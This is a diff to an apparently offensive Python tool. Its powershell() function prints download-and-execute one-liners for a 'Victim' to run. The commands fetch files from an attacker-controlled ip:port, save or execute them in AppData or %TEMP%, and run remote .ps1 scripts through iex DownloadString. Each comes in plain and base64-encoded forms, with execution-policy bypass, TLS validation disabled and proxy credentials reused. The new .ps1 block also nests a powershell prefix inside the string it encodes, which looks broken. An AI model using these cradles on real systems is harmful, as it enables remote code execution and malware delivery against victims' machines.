@@ -108,20 +108,24 @@ def powershell(ip,port,file,proxy,creds):
     else:
         wproxy = "$w = New-Object System.Net.WebClient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$w.proxy=[Net.WebRequest]::GetSystemWebProxy();w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};"
     print("\033[94mDownload a file\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','"+file+"')\n")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'"+file+"\')'.encode('UTF-16LE')).decode() + "\n")
+    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'"+file+"\')"
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C "+output+"\n")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
     
-    print("\033[94mDownload a file in AppData%\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file+"\n")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file+"'.encode('UTF-16LE')).decode() + "\n")
+    print("\033[94mDownload a file in AppData\033[0m")
+    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr http://"+ip+":"+port+"/"+file+" -Outfile $env:APPDATA\\"+file
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass "+output+"\n")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
     
     print("\033[94mDownload and execute a file in %TEMP%\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','%TEMP%\\"+file+"');.\%TEMP%\\"+file+"\n")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+"$w.DownloadFile(\'http://"+ip+":"+port+"/"+file+"\',\'%TEMP%\\"+file+"\');.\%TEMP%\\"+file+"'.encode('UTF-16LE')).decode() + "\n")
+    output = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" $w.DownloadFile('http://"+ip+":"+port+"/"+file+"','%TEMP%\\"+file+"');.\%TEMP%\\"+file
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C "+output+"\n")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
     
     print("\033[94mExecute a .ps1 script\033[0m")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" iex $w.DownloadString('http://"+ip+":"+port+"/"+file+"')\n")
-    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode('[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" iex $w.DownloadString(\'http://"+ip+":"+port+"/"+file+"\')'.encode('UTF-16LE')).decode() + "\n")
+    output = "powershell -nop -exec bypass -C [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"+wproxy+" iex $w.DownloadString('http://"+ip+":"+port+"/"+file+"')"
+    print("\033[38;5;208mVictim:\033[0m "+output+ "\n")
+    print("\033[38;5;208mVictim:\033[0m powershell -nop -exec bypass -e " + base64.b64encode(output.encode('UTF-16LE')).decode() + "\n")
 
 def regsvr32(ip,port,file,proxy):
     if not proxy :
